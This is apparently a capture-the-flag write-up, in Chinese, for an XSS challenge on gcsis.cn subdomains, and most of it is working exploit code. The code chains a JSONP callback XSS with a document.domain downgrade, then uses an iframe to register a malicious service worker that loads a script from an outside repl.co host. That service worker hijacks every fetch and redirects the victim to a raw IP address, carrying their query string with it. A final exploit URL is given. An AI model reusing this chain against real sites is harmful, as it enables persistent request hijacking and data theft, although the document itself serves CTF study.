整体思路



- 寻找一个jsonp-xss点   ➡️https://xss.xss.eec5b2.challenge.gcsis.cn/login?callback=alert(1)//

- 将两个子域降域 Bypass 同源
- 在xss子域中iframe拉取auth子域，并注入恶意Servive worker 拦截请求，发送至自己的vps
- 通过jsonp函数+script-src属性跨域加载js



test.js

```javascript
document.domain = "xss.eec5b2.challenge.gcsis.cn";
var iframetest = document.createElement('iframe');
iframetest.src = 'https://auth.xss.eec5b2.challenge.gcsis.cn/';
iframetest.addEventListener("load", function(){ 
	iframetest.contentWindow.eval(`navigator.serviceWorker.register("/api/loginStatus?callback=importScripts('//li3hiu.lihuaiqiu.repl.co/sw.js');//")`)
});
document.body.appendChild(iframetest);
```

sw.js

```javascript
self.addEventListener('install', function(event) {
        console.log('install ok!');
});
self.addEventListener('fetch', function (event) {
    var body = '<script>location="http://139.224.236.99?lih3iu"+location.search</script>';
    var init = {headers: {"Content-Type": "text/html"}};
    
    var res = new Response(body, init);
    event.respondWith(res.clone());
    
});
```



最终exp

```
https://xss.xss.eec5b2.challenge.gcsis.cn/login?callback=jsonp("https://li3hiu.lihuaiqiu.repl.co/test.js");
```



![0BMCrV.png](https://s1.ax1x.com/2020/10/08/0BMCrV.png)

